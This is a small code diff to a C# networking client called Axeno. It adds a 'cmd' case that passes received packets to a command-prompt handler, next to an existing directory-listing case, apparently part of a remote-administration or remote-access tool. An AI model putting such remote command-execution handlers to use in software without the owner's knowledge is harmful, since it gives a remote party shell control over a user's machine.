@@ -100,6 +100,11 @@ namespace Axeno.Client.Networking
                             ClientSocket.Send(FileManager.GetDirectory(dir));
                             break;
                         }
+                    case "cmd":
+                        {
+                            CommandPrompt.HandlePacket(msgpck);
+                            break;
+                        }
                 }
             }
             catch
